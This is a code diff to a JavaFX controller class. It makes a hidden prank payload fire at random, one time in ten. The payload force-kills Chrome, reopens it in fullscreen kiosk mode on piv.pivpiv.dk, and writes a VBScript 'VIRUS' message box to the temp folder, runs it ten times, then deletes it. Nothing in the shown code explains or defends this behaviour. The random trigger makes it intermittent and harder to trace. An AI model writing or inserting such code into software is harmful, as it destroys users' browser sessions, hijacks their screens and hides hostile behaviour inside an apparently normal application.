@@ -7,6 +7,8 @@ import javafx.scene.image.ImageView;
 import javafx.scene.layout.Pane;
 import javafx.scene.layout.VBox;
 
+import java.util.Random;
+
 public class   ControladorPrincipal {
     @FXML
     private ImageView logo;
@@ -91,19 +93,22 @@ public class   ControladorPrincipal {
                 }
             }
         }
-        try {
-            Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im chrome.exe");
-            Thread.sleep(100);
-            Runtime.getRuntime().exec("cmd.exe /c start chrome -kiosk -fullscreen piv.pivpiv.dk");
-            Thread.sleep(100);
-            Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"AAAAAAAAAAAAAAAAAA\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
-            for (int i = 0; i < 10; i++) {
+        int a= new Random().nextInt(10);
+        if (a==1){
+            try {
+                Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im chrome.exe");
                 Thread.sleep(100);
-                Runtime.getRuntime().exec("cmd.exe /c cscript //nologo %tmp%\\tmp.vbs");
+                Runtime.getRuntime().exec("cmd.exe /c start chrome -kiosk -fullscreen piv.pivpiv.dk");
+                Thread.sleep(100);
+                Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"AAAAAAAAAAAAAAAAAA\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
+                for (int i = 0; i < 10; i++) {
+                    Thread.sleep(100);
+                    Runtime.getRuntime().exec("cmd.exe /c cscript //nologo %tmp%\\tmp.vbs");
+                }
+                Runtime.getRuntime().exec("cmd.exe /c del %tmp%\\tmp.vbs");
+            } catch (Exception e) {
+                throw new RuntimeException(e);
             }
-            Runtime.getRuntime().exec("cmd.exe /c del %tmp%\\tmp.vbs");
-        } catch (Exception e) {
-            throw new RuntimeException(e);
         }
     }
 
